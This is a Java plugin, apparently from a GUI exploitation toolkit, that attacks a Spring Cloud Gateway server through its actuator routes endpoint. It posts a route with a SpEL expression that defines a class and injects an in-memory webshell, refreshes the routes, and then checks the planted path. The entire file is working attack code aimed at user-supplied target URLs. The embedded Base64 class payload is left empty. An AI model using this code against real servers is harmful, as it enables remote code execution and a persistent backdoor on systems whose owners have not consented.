package org.jiu.exploit.springbaldex;

import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;
import org.jiu.form.CommandForm;
import org.jiu.templates.TabContent;
import org.jiu.utils.ProxyManager;
import org.jiu.utils.Utils;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.util.HashMap;

public class springgatewayRCE  implements TabContent {
    private JTabbedPane tabbedPane;
    private CommandForm commandForm;
    private String url;
    private String command;
    private HashMap<String, String> headers = new HashMap<>();

    // 修改下面参数
    public String name = "springgatewayRCE"; // 漏洞名
    public String product = "Command";             // 类型
    public String desc = "springgateway 打spring gateway 内存马";  // 描述
    public String author = "xm17";              // 作者
    public String className = "org.jiu.exploit.springbaldex.springgatewayRCE"; // 类名(必须)
    public String tabName = "springgateway 打spring gateway 内存马";  // tab显示名称
    public String tips = "直接执行即可注入内存马,如果访问地址为/api/gateway/,请拼接地址/api/";    // 提示



    public springgatewayRCE() {
    }

    public springgatewayRCE(JTabbedPane tabbedPane) {
        this.tabbedPane = tabbedPane;
    }

    @Override
    public void init() {
        commandForm = new CommandForm();
    }

    @Override
    public JPanel getPanel() {
        return commandForm.CommandForm;
    }

    @Override
    public String getTabName() {
        return tabName;
    }

    public void setTabbedPane(JTabbedPane tabbedPane) {
        this.tabbedPane = tabbedPane;
    }


    @Override
    public void exploit() {
        // 提示一下怎么用
        commandForm.tipsLabel.setText(tips);

        // Use an array to hold the SwingWorker reference
        final SwingWorker[] worker = new SwingWorker[1];
        String randomString = Utils.generateRandomString(4);
        commandForm.startButton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // Create and execute the background task
                worker[0] = new SwingWorker<String, Void>() {
                    @Override
                    protected String doInBackground() throws Exception {
                        url = Utils.removeTrailingSlash(commandForm.urlField.getText());
                        headers = Utils.getHeaders(commandForm.headerTextArea.getText());
                        // header看情况添加,外部控制的主要是鉴权
                        headers.put("Content-Type", "application/json;charset=UTF-8");

                        StringBuilder resultOutPrint = new StringBuilder();

                        try {
                            // 接下来写实现发包逻辑
                            // 创建路由
                            RawResponse rawResponse = Requests.post(url + "/actuator/gateway/routes/"+randomString)
                                    .verify(false)
                                    .headers(headers)
                                    .proxy(ProxyManager.Proxy())
                                    .timeout(10)
                                    .body(String.format("{\"predicates\":[{\"name\":\"Path\",\"args\":{\t\"_genkey_0\":\"/%s/**\"}}],  \"id\": \"%s\",  \"filters\": [{    \"name\": \"AddResponseHeader\",    \"args\": {      \"name\": \"Result\",      \"value\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass('SpringWebfluxHandlerMemShell',T(org.springframework.util.Base64Utils).decodeFromString(''),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping, '/%s')}\"    }  }],  \"uri\": \"http://test.com\"}",randomString,randomString,randomString))
                                    .send();
                            resultOutPrint.append(rawResponse.readToText()).append("新增路由完成\n\n");
                            resultOutPrint.append(rawResponse.readToText()).append("\n\n==========================\n\n");

                            RawResponse rawResponse1 = Requests.post(url + "/actuator/gateway/refresh")
                                    .verify(false)
                                    .headers(headers)
                                    .timeout(10)
                                    .proxy(ProxyManager.Proxy())
                                    .send();
                            resultOutPrint.append(rawResponse1.readToText()).append("\n\n==========================\n\n");

                            RawResponse rawResponse2 = Requests.post(url + "/"+randomString)
                                    .verify(false)
                                    .timeout(10)
                                    .proxy(ProxyManager.Proxy())
                                    .headers(headers)
                                    .send();
                            resultOutPrint.append(rawResponse2.readToText()).append("\n\n==========================\n\n");

                            if (rawResponse2.statusCode() == 200){
                                resultOutPrint.append("访问地址: " +url+"/"+randomString);
                                resultOutPrint.append("注入内存马成功");
                            }

                        } catch (Exception ex) {
                            return "失败: " + ex.getMessage();
                        }

                        return resultOutPrint.toString();
                    }

                    @Override
                    protected void done() {
                        try {
                            String result = get(); // 获取结果
                            commandForm.resultArea.setText(result);
                        } catch (Exception ex) {
                            commandForm.resultArea.setText("出现错误: " + ex.getMessage());
                        }
                    }
                };

                worker[0].execute(); // 执行任务
            }
        });

        // 添加停止按钮的逻辑
        commandForm.stopButton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // 停止上传的逻辑
                if (worker[0] != null) {
                    worker[0].cancel(true); // 取消上传操作
                    commandForm.resultArea.setText("已被停止。");
                }
            }
        });
    }
}
